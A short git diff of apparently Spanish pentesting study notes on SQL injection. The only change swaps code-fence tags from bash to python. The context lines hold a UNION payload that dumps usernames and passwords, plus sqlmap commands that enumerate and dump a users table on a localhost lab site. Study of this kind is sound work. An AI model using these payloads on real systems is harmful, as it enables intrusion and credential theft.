@@ -61,14 +61,14 @@ id=32' union select group_concat(username,':',password) from users-- -
 -- - 
 ## Sqlmap
 -- - 
-```bash
+```python
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u --tables
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users --columns
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users -C username,password --dump
 ```
 
-```bash
+```python
 --dbs --> Enumera los posibles DBMS que hay de fondo.
 --dbms --> solamente prueba payloads para el dbms que le indiquemos. Ej: mysql, oracle, etc.
 --batch --> Hace que tome las opciones por defecto.
